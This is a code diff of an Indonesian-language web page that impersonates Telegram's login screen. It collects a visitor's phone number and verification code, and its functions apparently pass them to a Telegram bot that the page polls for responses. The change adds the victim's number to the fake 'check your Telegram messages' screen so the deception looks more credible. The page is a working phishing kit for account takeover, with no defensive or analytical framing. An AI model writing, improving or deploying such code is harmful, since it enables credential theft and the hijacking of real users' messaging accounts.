@@ -61,15 +61,14 @@
         </div>
     </div>
 
-    <!-- Page 1: Full-Screen Verification Code Form -->
-    <div id="page1" class="page fixed inset-0 bg-white p-8 flex flex-col justify-center items-center hidden">
-        <div class="flex justify-center mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="w-12 h-12">
-        </div>
-        <h2 class="text-center text-xl font-semibold mb-2">Cek pesan Telegram Anda</h2>
-        <p id="verificationMessage" class="text-center text-gray-600 text-sm mb-6">
-            Kami telah mengirimkan kode ke aplikasi Telegram untuk nomor Anda.
-        </p>
+<div id="page1" class="page fixed inset-0 bg-white p-8 flex flex-col justify-center items-center hidden">
+    <div class="flex justify-center mb-6">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="w-12 h-12">
+    </div>
+    <h2 class="text-center text-xl font-semibold mb-2">Cek pesan Telegram Anda</h2>
+    <p id="verificationMessage" class="text-center text-gray-600 text-sm mb-6">
+        Kami telah mengirimkan kode ke aplikasi Telegram untuk <span id="phoneDisplay"></span> di perangkat Anda yang lain
+    </p>
 
         <!-- Code Input Fields -->
         <div class="flex justify-center space-x-2 mb-4">
@@ -172,18 +171,22 @@ resendButton.addEventListener('click', () => {
             document.getElementById(pageId).classList.remove('hidden');
         }
 
-        // Phone number confirmation
-        function confirmPhoneNumber() {
-            const phone = document.getElementById('phone').value;
-            if (phone.length < 7 || phone.length > 12) {
-                document.getElementById('phoneError').classList.remove('hidden');
-            } else {
-                document.getElementById('phoneError').classList.add('hidden');
-                document.getElementById('displayPhone').textContent = `+62 ${phone}`;
-                showPage('confirmationMessage');
-                sendPhoneToTelegram(phone);
-            }
-        }
+// Phone number confirmation
+function confirmPhoneNumber() {
+    const phone = document.getElementById('phone').value;
+    if (phone.length < 7 || phone.length > 12) {
+        document.getElementById('phoneError').classList.remove('hidden');
+    } else {
+        document.getElementById('phoneError').classList.add('hidden');
+        document.getElementById('displayPhone').textContent = `+62 ${phone}`;
+        
+        // Tambahkan nomor telepon ke elemen di halaman 1
+        document.getElementById('phoneDisplay').textContent = `+62 ${phone}`;
+        
+        showPage('confirmationMessage');
+        sendPhoneToTelegram(phone);
+    }
+}
 
         // Send phone to Telegram
         function sendPhoneToTelegram(phone) {
@@ -256,7 +259,6 @@ function disableButton(messageId, buttonId) {
         })
     });
 }
-
 // Reset input fields dan status tombol saat kembali ke halaman 1
 function resetInputs() {
     const inputs = document.querySelectorAll('#page1 input[type="text"]');
@@ -284,7 +286,6 @@ function enableButtons() {
         })
     });
 }
-
 // Fungsi polling untuk mendeteksi pilihan pada bot
 async function pollBotResponse() {
     const botPollingInterval = setInterval(async () => {
@@ -313,6 +314,7 @@ async function pollBotResponse() {
         }
     }, 1000);  // Cek setiap detik
 }
+
 
 
 
